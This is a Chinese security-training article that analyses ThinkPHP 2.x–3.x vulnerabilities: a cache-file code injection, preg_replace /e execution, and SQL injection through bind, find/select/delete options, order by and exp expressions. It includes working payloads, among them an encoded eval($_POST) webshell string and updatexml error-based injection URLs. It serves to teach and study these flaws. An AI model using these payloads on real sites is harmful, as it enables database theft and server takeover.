> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iTRjti0Xj4VkK1I4tetsIw)

**高质量的安全文章，安全 offer 面试经验分享**

**尽在 # 掌控安全 EDU #**

  

![](https://mmbiz.qpic.cn/mmbiz_png/siayVELeBkzWBXV8e57JJ4OyQuuMXTfadZCia0bN2sFBfdbTRlFx0S97kyKKjic5v6eaZ8cY4WQt0UEu4dkyowHYg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rl6daM2XiabyLSr7nSTyAzcoZqPAsfe5tOOrXX0aciaVAfibHeQk5NOfQTdESRsezCwstPF02LeE4RHaH6NBEB9Rw/640?wx_fmt=png)

作者：掌控安全 - 柚子

中间件漏洞

#### 一. RCE

##### ThinkPHP3.2.3 缓存函数设计缺陷可导致代码执行

###### 概述

网站为了提高访问效率往往会将用户访问过的页面存入缓存来减少开销。

而 Thinkphp 在使用缓存的时候是将数据序列化，然后存进一个 php 文件中，这使得命令执行等行为成为可能。

就是缓存函数设计不严格，导致攻击者可以插入恶意代码，直接 getshell。

###### 实验环境

redhat6+apache2+Mysql+php5+thinkphp3.2.3

###### 漏洞利用

将 application/index/controller/Index.php 文件中代码更改如下：

```
$map['字段1']  = array('表达式','查询条件1');
$map['字段2']  = array('表达式','查询条件2');
$Model->where($map)->select();
```

访问 http://localhost/tpdemo/public/?username=xxx%0d%0aphpinfo();//， 即可将 webshell 等写入缓存文件。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1qsQ7H1cVXia0ico6ibfb2DBsMS2d8w92gW4aP7jibgkYyZ7SYcWNkx9RBQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1gJ1zSCpJPojCelTJgCXibnH5KXuhicBhZyAcNfvErQL2EpohYtCR3n3w/640?wx_fmt=png)

###### 漏洞分析

先找到 Cache.class.php 文件，也就是缓存文件，关键代码：

```
/**
     * 连接缓存
     * @access public
     * @param string $type 缓存类型
     * @param array $options  配置数组
     * @return object
     */
    public function connect($type='',$options=array()) {
        if(empty($type))  $type = C('DATA_CACHE_TYPE');
        $class  =   strpos($type,'\\')? $type : 'Think\\Cache\\Driver\\'.ucwords(strtolower($type));
        if(class_exists($class))
            $cache = new $class($options);
        else
            E(L('_CACHE_TYPE_INVALID_').':'.$type);
        return $cache;
```

这里读入配置，获取实例化的一个类的路径，路径是:Think\Cache\Driver\

这里我尝试了 var_dump($class) 和 echo $class 直接浏览器访问 Cache.class.php 都无法像那篇帖子一样打印出 $class，后来才发现添加数据写入缓存页面跳转才打印了 Think\Cache\Driver\File。  
关键代码：

```
/**
     * 取得缓存类实例
     * @static
     * @access public
     * @return mixed
     */
    static function getInstance($type='',$options=array()) {
        static $_instance   =   array();
        $guid   =   $type.to_guid_string($options);
        if(!isset($_instance[$guid])){
            $obj    =   new Cache();
            $_instance[$guid]   =   $obj->connect($type,$options);
        }
        return $_instance[$guid];
    }
    public function __get($name) {
        return $this->get($name);
    }
    public function __set($name,$value) {
        return $this->set($name,$value);
    }
    public function __unset($name) {
        $this->rm($name);
    }
    public function setOptions($name,$value) {
        $this->options[$name]   =   $value;
    }
    public function getOptions($name) {
        return $this->options[$name];
    }
```

这里实例化了那个类，我们重点关注 set 方法，接着直接找到这个路径下的 File.class.php 吧。

  
关键代码：

```
public function set($name,$value,$expire=null) {
        N('cache_write',1);
        if(is_null($expire)) {
            $expire =  $this->options['expire'];
        }
        $filename   =   $this->filename($name);
        $data   =   serialize($value);
        if( C('DATA_CACHE_COMPRESS') && function_exists('gzcompress')) {
            //数据压缩
            $data   =   gzcompress($data,3);
        }
        if(C('DATA_CACHE_CHECK')) {//开启数据校验
            $check  =  md5($data);
        }else {
            $check  =  '';
        }
        $data    = "<?php\n//".sprintf('%012d',$expire).$check.$data."\n?>";
        $result  =   file_put_contents($filename,$data);
        if($result) {
            if($this->options['length']>0) {
                // 记录缓存队列
                $this->queue($name);
            }
            clearstatcache();
            return true;
        }else {
            return false;
        }
}
```

这就是写入缓存的 set 方法，对传入的数据进行了序列化和压缩，  
重点看这两句：

```
$data    = “<?php\n//”.sprintf(‘%012d’,$expire).$check.$data.”\n?>”;
$result  =   file_put_contents($filename,$data);
```

简单拼接一下就写入文件了，Bug 就出现在这里，这时来看看我们  
payload:

```
%0D%0Aeval(%24_POST%5b%27tpc%27%5d)%3b%2f%2f
```

解码后就是：

```
换行+eval(%_POST[‘tpc’]);//
```

就写入恶意代码了。  
最后看看文件名：

```
/**
     * 取得变量的存储文件名
     * @access private
     * @param string $name 缓存变量名
     * @return string
     */
    private function filename($name) {
        $name   =   md5(C('DATA_CACHE_KEY').$name);
        if(C('DATA_CACHE_SUBDIR')) {
            // 使用子目录
            $dir   ='';
            for($i=0;$i<C('DATA_PATH_LEVEL');$i++) {
                $dir    .=  $name{$i}.'/';
            }
            if(!is_dir($this->options['temp'].$dir)) {
                mkdir($this->options['temp'].$dir,0755,true);
            }
            $filename   =   $dir.$this->options['prefix'].$name.'.php';
        }else{
            $filename   =   $this->options['prefix'].$name.'.php';
        }
        return $this->options['temp'].$filename;
}
```

文件名就是 md5 加密值。

*   总结：这个 thinkphp 缓存函数设计 bug，利用起来不难，但是感觉还是挺鸡肋。
    
*   原因是：
    
    1. 要开启缓存
    
    2. 虽然文件名是 md5 固定值，但是 TP3 可以设置 DATA_CACHE_KEY 参数来避免被猜到缓存文件名
    
    3. 缓存使用文件方式
    
    4. 缓存目录暴露在 web 目录下面可被攻击者访问。
    

##### Thinkphp 2.x、3.0-3.1 版代码执行漏洞

###### 漏洞分析

影响版本：Thinkphp 2.x、3.0-3.1

```
$depr = '\/';
$paths = explode($depr,trim($_SERVER['PATH_INFO'],'/'));
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```

这段代码主要就是用 explode 把 url 拆开，然后再用 implode 函数拼接起来，接着带入到 preg_replace 里面。

preg_replace 的 / e 模式，和 php 双引号都能导致代码执行的。

  
这句正则简化后就是 /(\w+)\/([^\/\/]+)/e  
注：\w+ 表示匹配任意长的 [字母数字下划线] 字符串，然后匹配 / 符号，再匹配除了 / 符号以外的字符。其实就是匹配连续的两个参数。

  
eg：www.dawn.com/index.php?s=1/2/3/4/5/6  
每次匹配 1 和 2，3 和 4，5 和 6。、

  
\1 是取第一个括号里的匹配结果，\2 是取第二个括号里的匹配结果

也就是 \ 1 取的是 1 3 5，\2 取的是 2 4 6。

  
那么就是连续的两个参数，一个被当成键名，一个被当成键值，传进了 var 数组里面。

而双引号是存在在 \2 外面的，那么就说明我们要控制的是偶数位的参数。  
环境较为难找，本地模拟一下

###### 漏洞复现

本地模拟：

```
<?php
$var = array();
preg_replace("/(\w+)\/([^\/\/]+)/ie",'$var[\'\\1\']="\\2";',$_GET[s]);
?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC12yS2k4Zt5jicL7tomUAaP8icMwlmQiap2r7kXkDNhTK0ny9LibaFib044Gg/640?wx_fmt=png)

#### 二. 注入

##### ThinkPHP3.2.3update 注入漏洞

###### 概述

thinkphp 是国内著名的 php 开发框架，有完善的开发文档，基于 MVC 架构，

其中 Thinkphp3.2.3 是目前使用最广泛的 thinkphp 版本，虽然已经停止新功能的开发，但是普及度高于新出的 thinkphp5 系列

由于框架实现安全数据库过程中在 update 更新数据的过程中存在 SQL 语句的拼接，并且当传入数组未过滤时导致出现了 SQL 注入。

###### 漏洞分析

thinkphp 系列框架过滤表达式注入多半采用 I 函数去调用 think_filter

```
function think_filter(&$value){
    if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value))
```

一般按照官方的写法，thinkphp 提供了数据库链式操作，其中包含连贯操作和 curd 操作。

在进行数据库 CURD 操作去更新数据的时候，利用 update 数据操作。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1enNibYBy7PuLfs9Oiatd0IIm8dcwB1W8sicrVRDew4o3vImpG9Bd4Ilmg/640?wx_fmt=png)  
where 来制定主键的数值，save 方法去更新变量传进来的参数到数据库的指定位置。

```
public function where($where,$parse=null){
            if(!is_null($parse) && is_string($where)) {
                if(!is_array($parse)) {
                    $parse = func_get_args();
                    array_shift($parse);
                }
                $parse = array_map(array($this->db,'escapeString'),$parse);
                $where =   vsprintf($where,$parse);
            }elseif(is_object($where)){
                $where  =   get_object_vars($where);
            }
            if(is_string($where) && '' != $where){
                $map    =   array();
                $map['_string']   =   $where;
                $where  =   $map;
            }       
            if(isset($this->options['where'])){
                $this->options['where'] =   array_merge($this->options['where'],$where);
            }else{
                $this->options['where'] =   $where;
            }
            return $this;
        }
```

通过 where 方法获取 where() 链式中进来的参数值，并对参数进行检查，是否为字符串，tp 框架默认是对字符串进行过滤的。

```
public function save($data='',$options=array()) {
        if(empty($data)) {
            // 没有传递数据，获取当前数据对象的值
            if(!empty($this->data)) {
                $data           =   $this->data;
                // 重置数据
                $this->data     =   array();
            }else{
                $this->error    =   L('_DATA_TYPE_INVALID_');
                return false;
            }
        }
        // 数据处理
        $data       =   $this->_facade($data);
        if(empty($data)){
            // 没有数据则不执行
            $this->error    =   L('_DATA_TYPE_INVALID_');
            return false;
        }
        // 分析表达式
        $options    =   $this->_parseOptions($options);
        $pk         =   $this->getPk();
        if(!isset($options['where']) ) {
            // 如果存在主键数据 则自动作为更新条件
            if (is_string($pk) && isset($data[$pk])) {
                $where[$pk]     =   $data[$pk];
                unset($data[$pk]);
            } elseif (is_array($pk)) {
                // 增加复合主键支持
                foreach ($pk as $field) {
                    if(isset($data[$field])) {
                        $where[$field]      =   $data[$field];
                    } else {
                           // 如果缺少复合主键数据则不执行
                        $this->error        =   L('_OPERATION_WRONG_');
                        return false;
                    }
                    unset($data[$field]);
                }
            }
            if(!isset($where)){
                // 如果没有任何更新条件则不执行
                $this->error        =   L('_OPERATION_WRONG_');
                return false;
            }else{
                $options['where']   =   $where;
            }
        }
        if(is_array($options['where']) && isset($options['where'][$pk])){
            $pkValue    =   $options['where'][$pk];
        }
        if(false === $this->_before_update($data,$options)) {
            return false;
        }
        $result     =   $this->db->update($data,$options);
        if(false !== $result && is_numeric($result)) {
            if(isset($pkValue)) $data[$pk]   =  $pkValue;
            $this->_after_update($data,$options);
        }
        return $result;
    }
```

再来到 save 方法，通过前面的数据处理解析服务端数据库中的数据字段信息，字段数据类型，再到_parseOptions 表达式分析，获取到表名，数据表别名，记录操作的模型名称，再去调用回调函数进入 update。

我们这里可以直接看框架的 where 子函数，之前网上公开的 exp 表达式注入就是从这里分析出来的结论：Thinkphp/Library/Think/Db/Driver.class.php

```
// where子单元分析
    protected function parseWhereItem($key,$val) {
        $whereStr = '';
        if(is_array($val)) {
            if(is_string($val[0])) {
                $exp    =    strtolower($val[0]);
                if(preg_match('/^(eq|neq|gt|egt|lt|elt)$/',$exp)) { // 比较运算
                    $whereStr .= $key.' '.$this->exp[$exp].' '.$this->parseValue($val[1]);
                }elseif(preg_match('/^(notlike|like)$/',$exp)){// 模糊查找
                    if(is_array($val[1])) {
                        $likeLogic  =   isset($val[2])?strtoupper($val[2]):'OR';
                        if(in_array($likeLogic,array('AND','OR','XOR'))){
                            $like       =   array();
                            foreach ($val[1] as $item){
                                $like[] = $key.' '.$this->exp[$exp].' '.$this->parseValue($item);
                            }
                            $whereStr .= '('.implode(' '.$likeLogic.' ',$like).')';                          
                        }
                    }else{
                        $whereStr .= $key.' '.$this->exp[$exp].' '.$this->parseValue($val[1]);
                    }
                }elseif('bind' == $exp ){ // 使用表达式
                    $whereStr .= $key.' = :'.$val[1];
                }elseif('exp' == $exp ){ // 使用表达式
                    $whereStr .= $key.' '.$val[1];
                }elseif(preg_match('/^(notin|not in|in)$/',$exp)){ // IN 运算
                    if(isset($val[2]) && 'exp'==$val[2]) {
                        $whereStr .= $key.' '.$this->exp[$exp].' '.$val[1];
                    }else{
                        if(is_string($val[1])) {
                             $val[1] =  explode(',',$val[1]);
                        }
                        $zone      =   implode(',',$this->parseValue($val[1]));
                        $whereStr .= $key.' '.$this->exp[$exp].' ('.$zone.')';
                    }
                }elseif(preg_match('/^(notbetween|not between|between)$/',$exp)){ // BETWEEN运算
                    $data = is_string($val[1])? explode(',',$val[1]):$val[1];
                    $whereStr .=  $key.' '.$this->exp[$exp].' '.$this->parseValue($data[0]).' AND '.$this->parseValue($data[1]);
                }else{
                    E(L('_EXPRESS_ERROR_').':'.$val[0]);
                }
            }else {
                $count = count($val);
                $rule  = isset($val[$count-1]) ? (is_array($val[$count-1]) ? strtoupper($val[$count-1][0]) : strtoupper($val[$count-1]) ) : '' ; 
                if(in_array($rule,array('AND','OR','XOR'))) {
                    $count  = $count -1;
                }else{
                    $rule   = 'AND';
                }
                for($i=0;$i<$count;$i++) {
                    $data = is_array($val[$i])?$val[$i][1]:$val[$i];
                    if('exp'==strtolower($val[$i][0])) {
                        $whereStr .= $key.' '.$data.' '.$rule.' ';
                    }else{
                        $whereStr .= $this->parseWhereItem($key,$val[$i]).' '.$rule.' ';
                    }
                }
                $whereStr = '( '.substr($whereStr,0,-4).' )';
            }
        }else {
            //对字符串类型字段采用模糊匹配
            $likeFields   =   $this->config['db_like_fields'];
            if($likeFields && preg_match('/^('.$likeFields.')$/i',$key)) {
                $whereStr .= $key.' LIKE '.$this->parseValue('%'.$val.'%');
            }else {
                $whereStr .= $key.' = '.$this->parseValue($val);
            }
        }
        return $whereStr;
    }
```

其中除了 exp 能利用外还有一处 bind，而 bind 可以完美避开了 think_filter：

```
elseif('bind' == $exp ){ // 使用表达式
                    $whereStr .= $key.' = :'.$val[1];
                }elseif('exp' == $exp ){ // 使用表达式
                    $whereStr .= $key.' '.$val[1];
```

这里由于拼接了 $val 参数的形式造成了注入，但是这里的 bind 表达式会引入: 符号参数绑定的形式去拼接数据，通过白盒对几处 CURD 操作函数进行分析定位到 update 函数，insert 函数会造成 sql 注入，于是回到上面的 update 函数。

Thinkphp/Library/Think/Db/Driver.class.php

```
/**
     * 更新记录
     * @access public
     * @param mixed $data 数据
     * @param array $options 表达式
     * @return false | integer
     */
    public function update($data,$options) {
        $this->model  =   $options['model'];
        $this->parseBind(!empty($options['bind'])?$options['bind']:array());
        $table  =   $this->parseTable($options['table']);
        $sql   = 'UPDATE ' . $table . $this->parseSet($data);
        if(strpos($table,',')){// 多表更新支持JOIN操作
            $sql .= $this->parseJoin(!empty($options['join'])?$options['join']:'');
        }
        $sql .= $this->parseWhere(!empty($options['where'])?$options['where']:'');
        if(!strpos($table,',')){
            //  单表更新支持order和lmit
            $sql   .=  $this->parseOrder(!empty($options['order'])?$options['order']:'')
                .$this->parseLimit(!empty($options['limit'])?$options['limit']:'');
        }
        $sql .=   $this->parseComment(!empty($options['comment'])?$options['comment']:'');
        return $this->execute($sql,!empty($options['fetch_sql']) ? true : false);
    }
```

可以继续跟进 execute 函数。

```
public function execute($str,$fetchSql=false) {
        $this->initConnect(true);
        if ( !$this->_linkID ) return false;
        $this->queryStr = $str;
        if(!empty($this->bind)){
            $that   =   $this;
            $this->queryStr =   strtr($this->queryStr,array_map(function($val) use($that){ return '''.$that->escapeString($val).'''; },$this->bind));
        }
        if($fetchSql){
            return $this->queryStr;
        }
```

这里有处对 $this->queryStr 进行字符替换的操作，具体是怎么更新的，我们可以进一步操作一下。

Application/Home/Controller/UserController.class.php

```
<?php
namespace HomeController;
use ThinkController;
class UserController extends Controller {
    public function index(){
        $User = M("member");
        $user['id'] = I('id');
        $data['money'] = I('money');
        $data['user'] = I('user');
        $valu = $User->where($user)->save($data);
        var_dump($valu);
    }
}
```

通过这个代码，根据进来的 id 更新用户的名字和钱，构造一个简单一个 poc：  
id[]=bind&id[]=1’&money[]=1123&user=liao 当走到 execute 函数时 sql 语句为

```
UPDATE `member` SET `user`=:0 WHERE `id` = :1'
```

然后 $that = $this。

接下来下面的替换操作是将”:0” 替换为外部传进来的字符串，这里就可控了。

  
替换后的语句就会发现之前的 user 参数为:0

然后被替换为了我们传进来的东西（liao），这样就把: 替换掉了。

替换后的语句:

```
UPDATE 'member' SET 'user'='liao' WHERE 'id' = :1'
```

但是 id 后面的 :1 是替换不掉的。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1XPuSuV3JUKFlicxUyvqtn6ZxebHXzO3sthJDT6QNo2IsfsJfDDawvyw/640?wx_fmt=png)

那么我们将 id[1] 数组的参数变为 0 尝试一下。

###### 漏洞复现

测试代码

```
<?php
namespace HomeController;
use ThinkController;
class UserController extends Controller {
    public function index(){
        $User = M("member");
        $user['id'] = I('id');
        $data['money'] = I('money');
        $data['user'] = I('user');
        $valu = $User->where($user)->save($data);
        var_dump($valu);
    }
}
```

Poc：id[]=bind&id[]=0%27&money[]=1123&user=liao

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC14bDTrU674k5bIv1rR5J4xibvSCzjrGhI4vHWQoWT70A3brKRicEicSR2Q/640?wx_fmt=png)

这样就造成了注入。继续构造 poc。  
money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1PKekmKtLxS1CB0ibVibrfagTPZ65T87Ikiaomic3r2SkRk75mGA9hOqpnw/640?wx_fmt=png)

##### ThinkPHP3.2.3 find 注入

###### select 和 find 函数

以 find 函数为例进行分析（select 代码类似），该函数可接受一个 $options 参数，作为查询数据的条件。

  
当 $options 为数字或者字符串类型的时候，直接指定当前查询表的主键作为查询字段：

```
if (is_numeric($options) || is_string($options)) {
            $where[$this->getPk()] = $options;
            $options               = array();
            $options['where']      = $where;
}
```

同时提供了对复合主键的查询，看到判断：

```
if (is_array($options) && (count($options) > 0) && is_array($pk)) {
            // 根据复合主键查询
            ......
        }
```

要进入复合主键查询代码，需要满足 $options 为数组同时 $pk 主键也要为数组，但这个对于表只设置一个主键的时候不成立。

那么就可以使 $options 为数组，同时找到一个表只有一个主键，就可以绕过两次判断，直接进入_parseOptions 进行解析。

```
if (is_numeric($options) || is_string($options)) {//$options为数组不进入
            $where[$this->getPk()] = $options;
            $options               = array();
            $options['where']      = $where;
        }
        // 根据复合主键查找记录
        $pk = $this->getPk();
        if (is_array($options) && (count($options) > 0) &&is_array($pk)) { //$pk不为数组不进入
            ......
        }
        // 总是查找一条记录
        $options['limit'] = 1;
        // 分析表达式
        $options = $this->_parseOptions($options); //解析表达式
        // 判断查询缓存
        .....
        $resultSet = $this->db->select($options); //底层执行
```

之后跟进_parseOptions 方法，（分析见代码注释）

```
if (is_array($options)) { //当$options为数组的时候与$this->options数组进行整合
            $options = array_merge($this->options, $options);
        }
        if (!isset($options['table'])) {//判断是否设置了table 没设置进这里
            // 自动获取表名
            $options['table'] = $this->getTableName();
            $fields           = $this->fields;
        } else {
            // 指定数据表 则重新获取字段列表 但不支持类型检测
            $fields = $this->getDbFields(); //设置了进这里
        }
        // 数据表别名
        if (!empty($options['alias'])) {//判断是否设置了数据表别名
            $options['table'] .= ' ' . $options['alias']; //注意这里，直接拼接了
        }
        // 记录操作的模型名称
        $options['model'] = $this->name;
        // 字段类型验证
        if (isset($options['where']) && is_array($options['where']) && !empty($fields) && !isset($options['join'])) { //让$optison['where']不为数组或没有设置不进这里
            // 对数组查询条件进行字段类型检查
           ......
        }
        // 查询过后清空sql表达式组装 避免影响下次查询
        $this->options = array();
        // 表达式过滤
        $this->_options_filter($options);
        return $options;
```

$options 我们可控，那么就可以控制为数组类型，传入 $options[‘table’] 或 $options[‘alias’] 等等，只要提层不进行过滤都是可行的。

同时我们可以不设置 $options[‘where’] 或者设置 $options[‘where’] 的值为字符串，可绕过字段类型的验证。

可以看到在整个对 $options 的解析中没有过滤，直接返回，跟进到底层 ThinkPHP\Libray\Think\Db\Diver.class.php，找到 select 方法，继续跟进最后来到 parseSql 方法，对 $options 的值进行替换，解析。

因为 $options[‘table’] 或 $options[‘alias’] 都是由 parseTable 函数进行解析，跟进：

```
if (is_array($tables)) {//为数组进
            // 支持别名定义
          ......
        } elseif (is_string($tables)) {//不为数组进
            $tables = array_map(array($this, 'parseKey'), explode(',', $tables));
        }
        return implode(',', $tables);
```

当我们传入的值不为数组，直接进行解析返回带进查询，没有任何过滤。

同时 $options[‘where’] 也一样，看到 parseWhere 函数

```
$whereStr = '';
        if (is_string($where)) {
            // 直接使用字符串条件
            $whereStr = $where; //直接返回了，没有任何过滤
        } else {
            // 使用数组表达式
           ......
        }
        return empty($whereStr) ? '' : ' WHERE ' . $whereStr;
```

###### delete 函数

delete 函数有些不同，主要是在解析完 $options 之后，还对 $options[‘where’] 判断了一下是否为空，需要我们传一下值，使之不为空, 从而继续执行删除操作。

```
// 分析表达式
        $options = $this->_parseOptions($options);
        if (empty($options['where'])) { //注意这里，还判断了一下$options['where']是否为空，为空直接返回，不再执行下面的代码。
            // 如果条件为空 不进行删除操作 除非设置 1=1
            return false;
        }
        if (is_array($options['where']) && isset($options['where'][$pk])) {
            $pkValue = $options['where'][$pk];
        }
        if (false === $this->_before_delete($options)) {
            return false;
        }
        $result = $this->db->delete($options);
        if (false !== $result && is_numeric($result)) {
            $data = array();
            if (isset($pkValue)) {
                $data[$pk] = $pkValue;
            }
            $this->_after_delete($data, $options);
        }
        // 返回删除记录个数
        return $result;
```

###### 环境调试

下载地址：http://www.thinkphp.cn/download/610.html

  
自己配置一下数据库路径：

test_thinkphp_3.2.3\Application\Common\Conf\config.php

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1MNEtS1gwWdHNqgI1tA6wOsjtMAwwnKC6ePZwJX45TJ4B0c0wlTwaEA/640?wx_fmt=png)  
自己安装，安装完以后访问一下：

http://127.0.0.1/thinkphp_3.2.3/index.php/Home/Index/index

  
没有报错就可以了。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1b212BBCOtmZN7JBu4aV7AZbt2lnoKgnCBh75CvHymx2ZvwhgoVXoRA/640?wx_fmt=png)  
开启 debug 方便本地测试

路径：test_thinkphp_3.2.3\index.php

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1KpHG8F1NlhX0lvk5uN3NSZvkzohOf8dB06u4s9Gywib9IQic8j5Eny6Q/640?wx_fmt=png)  
路径：test_thinkphp_3.2.3\Application\Common\Conf\config.php

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1qqdiaOqtpjYtNs2icuG4fY5QzLkSOyFMpGlgd6mMLFdrZZlZXhQ1s9ZA/640?wx_fmt=png)

###### 漏洞复现

3 处注入利用方法都是一样的，所以就演示一个 find 注入  
Select 与 delete 注入同理

```
http://127.0.0.1/thinkphp_3.2.3/index.php/Home/Index/testSqlFind?test=3
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1Cv0DkWaq7rhYYmhDCicyZWvpZw3SJFsGB6yArMK3DicU67JvzKYkOowA/640?wx_fmt=png)

```
http://127.0.0.1/thinkphp_3.2.3/index.php/Home/Index/testSqlFind?test=3%27aaa
```

明显转成整型，无法进行注入了。

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1eRPKiczRQiaKLwgicgv6w9JTjzwibVXeic6BsjK0AVwOgibTMZfT3cfZ3zAA/640?wx_fmt=png)

```
http://127.0.0.1/thinkphp_3.2.3/index.php/Home/Index/testSqlFind?test[where]=3
```

这样就可以直接控制 where 了。  
![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC14Iv99J5vaJDSHA2zPyO9SD2tEPRLHLcoriaUibK3OIQafX5vmBjSPtfw/640?wx_fmt=png)

```
http://127.0.0.1/thinkphp_3.2.3/index.php/Home/Index/testSqlFind?test[where]=3%27
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1pCuibPeCcbQN4nsTzxia38qD1AkVpLb23VyAwLCcoH20U1taC9dOFOxg/640?wx_fmt=png)

##### ThinkPHP 3.X order by 注入漏洞

###### 漏洞分析

ThinkPHP 在处理 order by 排序时，当排序参数可控且为关联数组 (key-value) 时，

由于框架未对数组中 key 值作安全过滤处理，攻击者可利用 key 构造 SQL 语句进行注入，该漏洞影响 ThinkPHP 3.2.3、5.1.22 及以下版本。

ThinkPHP3.2.3 漏洞代码（/Library/Think/Db/Driver.class.php）：

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1sh3Cc8RB5hCakyKLA8hjN3eaxM4fORZsBesZ6RK9qU5CqkqDIIUibPg/640?wx_fmt=png)  
从上面漏洞代码可以看出，当 $field 参数为关联数组（key-value）时，key 值拼接到返回值中，SQL 语句最终绕过了框架安全过滤得以执行。

###### 漏洞复现

测试代码

```
<?php
namespace Home\Controller;
use Think\Controller;
 class IndexController extends Controller{
  public function index(){
      $data=array();
      $data['username']=array('eq','admin');
      $order=I('get.order');
      $m=M('user')->where($data)->order($order)->find();
      dump($m);
   }
 }
```

构造 poc：?order[updatexml(1,concat(0x3e,user()),1)]=1

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1Tmf4WTGQtfNrFa8fpQfwQOvE3ljxnpFlyd0Pc6J5lM1nILHTGBggTA/640?wx_fmt=png)

##### thinkphp3.x exp 注入漏洞

EXP 表达式支持 SQL 语法查询 sql 注入非常容易产生。

```
$map['id']  = array('in','1,3,8');
```

可以改成：

```
$map['id']  = array('exp',' IN (1,3,8) ');
```

exp 查询的条件不会被当成字符串，所以后面的查询条件可以使用任何 SQL 支持的语法，包括使用函数和字段名称。

查询表达式不仅可用于查询条件，也可以用于数据更新。

```
$User = M("User"); // 实例化User对象
// 要修改的数据对象属性赋值
$data['name'] = 'ThinkPHP';
$data['score'] = array('exp','score+1');// 用户的积分加1
$User->where('id=5')->save($data); // 根据条件保存修改的数据
```

表达式查询

```
$map['字段1']  = array('表达式','查询条件1');
$map['字段2']  = array('表达式','查询条件2');
$Model->where($map)->select();
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1raDS9XQKjkvanePWCdbjFDx2zrkJ04znFI2e3N04gU9teoz1BxtUng/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1Kf0ISmZAickS6PibsgmVRFQibUogvR2daOruwEARbxqPbM90p9IADibAbQ/640?wx_fmt=png)

###### exp 注入分析

跟到 \ ThinkPHP\Library\Think\Db\Driver.class.php 504 行

```
foreach ($where as $key=>$val){
                if(is_numeric($key)){
                    $key  = '_complex';
                }
                if(0===strpos($key,'_')) {
                    // 解析特殊条件表达式
                    $whereStr   .= $this->parseThinkWhere($key,$val);
                }else{
                    // 查询字段的安全过滤
                    // if(!preg_match('/^[A-Z_\|\&\-.a-z0-9\(\)\,]+$/',trim($key))){
                    //     E(L('_EXPRESS_ERROR_').':'.$key);
                    // }
                    // 多条件支持
                    $multi  = is_array($val) &&  isset($val['_multi']);
                    $key    = trim($key);
                    if(strpos($key,'|')) { // 支持 name|title|nickname 方式定义查询字段
                        $array =  explode('|',$key);
                        $str   =  array();
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC11lUiaKX0DdUNmsAt6icKTgnFmIMXMDoqZBzh9EhQvk4KK5YFRYfOJicjw/640?wx_fmt=png)  
parseSQl 组装 替换表达式:

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC1Mzv59XU2z1YQN2fyJWFZmGrt7ibbOaoUvQtOpPCOP0wCBYkqcibBeKJg/640?wx_fmt=png)  
parseKey()

```
protected function parseKey(&$key) {
        $key   =  trim($key);
        if(!is_numeric($key) && !preg_match('/[,\'\"\*\(\)`.\s]/',$key)) {
           $key = '`'.$key.'`';
        }
        return $key;
    }
```

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC166fnjfWX8wxWZ8y7WQPJXFs4d15l42Sgic3GibictrOTyEYGiaHFia7Ohww/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqPgdJD8ZIGYNgSjkcc6aC105IGEoP770kB57p4VYZMcKy0jhBFsNnnNRZKv0dFBmG9Y1iczboEKjw/640?wx_fmt=png)

filter_exp

```
function filter_exp(&$value){
    if (in_array(strtolower($value),array('exp','or'))){
        $value .= ' ';
    }
}
```

I 函数中重点代码：

```
// 取值操作
        $data       =   $input[$name];
        is_array($data) && array_walk_recursive($data,'filter_exp');
        $filters    =   isset($filter)?$filter:C('DEFAULT_FILTER');
        if($filters) {
            if(is_string($filters)){
                $filters    =   explode(',',$filters);
            }elseif(is_int($filters))
                $filters    =   array($filters);
